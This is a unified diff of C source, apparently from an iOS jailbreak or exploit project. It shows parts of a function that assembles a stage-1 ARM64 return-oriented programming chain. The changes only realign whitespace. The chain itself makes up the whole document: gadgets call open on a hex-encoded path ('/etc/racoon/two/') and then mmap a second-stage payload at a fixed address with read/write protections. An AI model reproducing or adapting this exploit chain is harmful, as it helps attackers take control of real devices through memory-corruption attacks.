@@ -185,10 +185,10 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();							   // 0x28		[2] x24 [3] x2/third arg
 	ADD_STATIC_GADGET(O_RDONLY);			   // 0x30		[2] x25 [3] x1/second arg
 	ADD_OFFSET_GADGET(0xb8);				   // 0x38		[2] x26 [3] x0/first arg
-	ADD_CODE_GADGET(offsets->open);		   // 0x40		[2] x27 [3] call gadget
+	ADD_CODE_GADGET(offsets->open);			   // 0x40		[2] x27 [3] call gadget
 	ADD_GADGET();							   // 0x48		[2] x28 
 	ADD_CODE_GADGET(offsets->longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
-	ADD_CODE_GADGET(offsets->BEAST_GADGET);   // 0x58		[2] x30 (next gadget)
+	ADD_CODE_GADGET(offsets->BEAST_GADGET);    // 0x58		[2] x30 (next gadget)
 	ADD_GADGET();							   // 0x60		[2] x29
 	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
 	ADD_GADGET();							   // 0x70		[2] weird Dx registers
@@ -205,9 +205,9 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_STATIC_GADGET(0x6361722f6374652f);	   // 0xc0		[3] d9             (/etc/rac)				 
 	ADD_STATIC_GADGET(0x2f6f77742f6e6f6f);	   // 0xc8		[3] d8             (oon/two/)
 	ADD_STATIC_GADGET(0x0);					   // 0xd0		[3] x28           
-	ADD_CODE_GADGET(offsets->mmap);		   // 0xd8		[3] x27 [4] call gadget
-	ADD_STATIC_GADGET(offsets->stage2_base);  // 0xe0		[3] x26 [4] x0/first arg
-	ADD_STATIC_GADGET(offsets->stage2_size);  // 0xe8		[3] x25 [4] x1/second arg
+	ADD_CODE_GADGET(offsets->mmap);			   // 0xd8		[3] x27 [4] call gadget
+	ADD_STATIC_GADGET(offsets->stage2_base);   // 0xe0		[3] x26 [4] x0/first arg
+	ADD_STATIC_GADGET(offsets->stage2_size);   // 0xe8		[3] x25 [4] x1/second arg
 	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0xf0		[3] x24 [4] x2/third arg
 	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE) // 0xf8		[3] x23 [4] x3/fourth arg
 	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x100		[3] x22 [4] x4/fifth arg
@@ -215,7 +215,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_STATIC_GADGET(0);					   // 0x110		[3] x20 [4] x5/sixth arg
 	ADD_GADGET();							   // 0x118		[3] x19 [4] x7/eighth arg
 	ADD_GADGET();							   // 0x120		[3] x29
-	ADD_CODE_GADGET(offsets->BEAST_GADGET);   // 0x128		[3] x30 (next gadget)
+	ADD_CODE_GADGET(offsets->BEAST_GADGET);    // 0x128		[3] x30 (next gadget)
 
 	ADD_GADGET();							   // 0x130		[3] new stack top
 	ADD_GADGET();							   // 0x138		
